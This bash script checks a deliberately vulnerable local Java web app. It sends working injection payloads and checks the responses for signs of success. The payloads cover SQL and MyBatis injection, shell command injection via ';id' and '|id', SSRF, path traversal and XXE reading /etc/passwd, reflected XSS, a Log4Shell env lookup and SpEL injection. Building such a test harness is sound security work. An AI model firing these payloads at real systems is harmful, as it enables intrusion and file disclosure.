#!/bin/bash
# Quick Vulnerability Validation Script
# Uses curl for basic vulnerability verification

BASE_URL="http://localhost:8080"
PASSED=0
FAILED=0

echo "======================================"
echo "Vulnerability Validation (curl)"
echo "Target: $BASE_URL"
echo "======================================"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

test_vuln() {
    local id="$1"
    local name="$2"
    local method="$3"
    local endpoint="$4"
    local payload="$5"
    local indicator="$6"

    echo "Testing: $id - $name"

    # Build full URL
    if [[ "$method" == "GET" ]]; then
        if [[ "$payload" == *"?"* ]]; then
            full_url="${BASE_URL}${endpoint}?${payload}"
        else
            full_url="${BASE_URL}${endpoint}?${payload}"
        fi
        response=$(curl -s -w "\n%{http_code}" "$full_url")
    else
        response=$(curl -s -w "\n%{http_code}" -X POST -H "Content-Type: application/json" -d "$payload" "${BASE_URL}${endpoint}")
    fi

    # Get status code (last line)
    status_code=$(echo "$response" | tail -n1)
    # Get body (everything except last line)
    body=$(echo "$response" | sed '$d')

    # Check for indicator
    if echo "$body" | grep -qi "$indicator"; then
        echo -e "  ${GREEN}✓ PASSED${NC}: Found '$indicator' in response"
        ((PASSED++))
    else
        echo -e "  ${RED}✗ FAILED${NC}: Indicator '$indicator' not found"
        echo "  Response: $body"
        ((FAILED++))
    fi
    echo ""
}

# SQL Injection Tests
echo "=== SQL Injection ==="
test_vuln "SQLI-001" "SQL Injection - Basic" "GET" "/sqli/jdbc/vuln" \
    "username=admin' OR '1'='1" "Username:"

test_vuln "SQLI-002" "SQL Injection - LIKE" "GET" "/sqli/like/vuln" \
    "username=admin%' OR '1'='1" "Username:"

# MyBatis Tests
echo "=== MyBatis SQL Injection ==="
test_vuln "MYBATIS-001" "MyBatis \${} injection" "GET" "/mybatis/vuln01" \
    "username=admin' OR '1'='1" "results"

# SSRF Tests
echo "=== SSRF ==="
test_vuln "SSRF-001" "SSRF - file read" "GET" "/ssrf/urlconnection/vuln" \
    "url=file:///etc/passwd" "root:"

# Command Injection Tests
echo "=== Command Injection ==="
test_vuln "CMD-001" "Command Injection - semicolon" "GET" "/cmd/runtime/vuln" \
    "filename=test.txt;id" "uid="

test_vuln "CMD-002" "Command Injection - pipe" "GET" "/cmd/ping/vuln" \
    "host=8.8.8.8|id" "uid="

# XSS Tests
echo "=== XSS ==="
test_vuln "XSS-001" "XSS - Reflected" "GET" "/xss/reflect" \
    "vuln=<script>alert(1)</script>" "<script>"

# Log4Shell Tests
echo "=== Log4Shell ==="
test_vuln "LOG4J-001" "Log4Shell - Env Leak" "GET" "/log4j/vuln" \
    "token=\${env:USER}" "root"

# Path Traversal Tests
echo "=== Path Traversal ==="
test_vuln "PATH-001" "Path Traversal - ../" "GET" "/path/traversal/vuln" \
    "filename=../../../../../etc/passwd" "root:"

# SpEL Tests
echo "=== SpEL Injection ==="
test_vuln "SPEL-001" "SpEL - Info Leak" "GET" "/spel/vuln1" \
    "expression=T(java.lang.System).getProperty('os.name')" "Linux"

# XXE Tests
echo "=== XXE ==="
xxe_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
test_vuln "XXE-001" "XXE - DocumentBuilder" "POST" "/xxe/documentbuilder/vuln" \
    "$xxe_payload" "root:"

# Summary
echo "======================================"
echo "SUMMARY"
echo "======================================"
total=$((PASSED + FAILED))
echo "Total:  $total"
echo -e "PASSED: ${GREEN}$PASSED${NC}"
echo -e "FAILED: ${RED}$FAILED${NC}"
echo ""

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}All vulnerabilities validated!${NC}"
    exit 0
else
    echo -e "${RED}Some vulnerabilities failed validation${NC}"
    exit 1
fi
